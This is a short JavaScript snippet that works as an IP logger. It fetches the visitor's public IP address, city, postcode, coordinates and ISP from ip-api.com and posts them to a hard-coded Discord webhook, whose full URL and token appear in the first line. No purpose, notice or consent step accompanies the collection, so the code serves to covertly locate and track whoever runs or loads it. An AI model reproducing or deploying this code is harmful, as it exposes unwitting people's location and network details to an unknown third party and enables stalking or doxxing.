// Set up the Discord webhook URL
const webhookURL = 'https://discord.com/api/webhooks/1220786784426922025/OXXd7xO_wT8mc48DTBIJ2tDY45OyH8X5pPllvaR8RY65SJlpp8lRlj45QHO1j9OjfnL-';

// Send a request to the ip-api API
fetch('http://ip-api.com/json/')
  .then(response => response.json())
  .then(data => {
    // Extract the requested fields from the response
    const country = data.country;
    const ip = data.query;
    const countryCode = data.countryCode;
    const region = data.region;
    const regionName = data.regionName;
    const city = data.city;
    const zip = data.zip;
    const lat = data.lat;
    const lon = data.lon;
    const timezone = data.timezone;
    const isp = data.isp;
    const org = data.org;
    const as = data.as;
    
    const message = {
      content: `Country: ${country}\nIP: ${ip}\nCountry Code: ${countryCode}\nRegion: ${region}\nRegion Name: ${regionName}\nCity: ${city}\nZip: ${zip}\nLat: ${lat}\nLon: ${lon}\nTimezone: ${timezone}\nISP: ${isp}\nOrg: ${org}\nAS: ${as}`
    };
    fetch(webhookURL, {
      method: 'POST',
      body: JSON.stringify(message),
      headers: {
        'Content-Type': 'application/json'
      }
    })
    .then(response => console.log('Message sent to Discord webhook:', response.statusText))
    .catch(error => console.error('Error sending message to Discord webhook:', error));
  })
  .catch(error => console.error('Error requesting ip-api API:', error));
